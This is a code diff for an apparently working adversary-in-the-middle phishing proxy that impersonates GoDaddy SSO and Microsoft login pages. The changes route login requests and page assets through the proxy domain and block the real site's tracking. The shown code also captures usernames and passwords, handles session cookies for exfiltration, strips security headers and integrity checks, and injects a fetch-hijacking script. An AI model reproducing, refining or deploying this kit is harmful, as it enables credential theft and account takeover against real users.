@@ -106,30 +106,35 @@ function generateInterceptorScript(upstreamDomain) {
 
   function rewriteUrl(url) {
     if (!url || typeof url !== 'string') return url;
+
+    // Aggressive tracking block
     if (/eventbus\/web|rum\/events|apm\//.test(url)) {
-      console.log('[Proxy Interceptor] Silently blocked tracking:', url);
+      console.log('[Proxy Interceptor] Blocked tracking:', url);
       return 'about:blank';
     }
+
     if (url.includes(PROXY_DOMAIN + PROXY_PREFIX)) return url;
 
     try {
       let u;
       if (url.startsWith('http')) u = new URL(url);
       else if (url.startsWith('//')) u = new URL('https:' + url);
-      else if (url.startsWith('/')) return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + UPSTREAM + url;
+      else if (url.startsWith('/')) {
+        // Force all GoDaddy paths through proxy
+        if (url.includes('trust-center') || url.includes('_next/static/media') || url.includes('/v1/api/pass/login')) {
+          return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + 'sso.godaddy.com' + url;
+        }
+        return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + UPSTREAM + url;
+      }
 
-      if (u && shouldProxyDomain(u.hostname)) {
+      if (u && (shouldProxyDomain(u.hostname) || u.hostname.includes('godaddy'))) {
         return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + u.hostname + u.pathname + u.search + u.hash;
       }
     } catch(e) {}
     return url;
   }
 
-  function shouldProxyDomain(h) {
-    return /godaddy|secureserver|wsimg|microsoft|live|office|msauth/.test(h);
-  }
-
-  // Fetch override
+  // Fetch override (most important for login POST)
   const origFetch = window.fetch;
   window.fetch = function(resource, init) {
     const rewritten = typeof resource === 'string' ? rewriteUrl(resource) : resource;
@@ -180,7 +185,6 @@ export default async function handleRequest(request) {
       const text = await cloned.text();
       body = text;
 
-      // Credential capture
       if (text.includes('username=') || text.includes('passwd=') || text.includes('password=')) {
         const params = new URLSearchParams(text);
         const user = params.get('username') || params.get('loginfmt') || params.get('email');
@@ -210,10 +214,8 @@ export default async function handleRequest(request) {
     newHeaders.set('Access-Control-Allow-Methods', '*');
     newHeaders.set('Access-Control-Allow-Headers', '*');
 
-    // Remove security headers
     ['content-security-policy', 'strict-transport-security', 'x-frame-options', 'referrer-policy', 'permissions-policy'].forEach(h => newHeaders.delete(h));
 
-    // Cookie handling + exfil
     const setCookies = resp.headers.getSetCookie?.() || [];
     if (setCookies.length) {
       setCookies.forEach(c => {
@@ -232,31 +234,30 @@ export default async function handleRequest(request) {
 
       if (ct.includes('text/html')) {
         text = text.replace('<head>', `<head>${generateInterceptorScript(upstreamDomain)}`);
-        // SRI strip
         text = text.replace(/<(script|link)[^>]*?\s+integrity=["'][^"']*["'][^>]*>/gi, m => m.replace(/\s+integrity=["'][^"']*["']/i, ''));
       }
 
-      // === CRITICAL REWRITING FIXES ===
+      // === IMPROVED URL REWRITING ===
 
-      // 1. Logo / trust-center image fix (m365.8f1933cb.png)
+      // 1. Trust-center logo fix (most important)
       text = text.replace(
         /(src|href)=["']\/?trust-center\/_next\/static\/media\/([^"']+)["']/gi,
         `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/trust-center/_next/static/media/$2"`
       );
 
-      // 2. General _next/static/media fix
+      // 2. General Next.js media
       text = text.replace(
         /(src|href)=["']\/_next\/static\/media\/([^"']+)["']/gi,
         `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/_next/static/media/$2"`
       );
 
-      // 3. Root-relative and other paths
+      // 3. Root-relative paths
       text = text.replace(/(src|href|action)=["']\/([^"']+)["']/gi, (match, attr, path) => {
         if (path.startsWith('_p/') || path.includes('data:') || path.startsWith('#')) return match;
         return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
       });
 
-      // 4. GoDaddy-specific cleanup
+      // 4. Cleanup
       text = text.replace(/\/id-id\/godaddy-404/gi, '/');
       text = text.replace(/godaddy-404/gi, '');
 
@@ -267,7 +268,7 @@ export default async function handleRequest(request) {
           `https://${YOUR_DOMAIN}${PROXY_PREFIX}${d}$1`);
       });
 
-      // 6. CSS url() fix
+      // 6. CSS url() fix (no more ur[] typo)
       text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/gi, (match, fullUrl) => {
         try {
           const u = new URL(fullUrl);
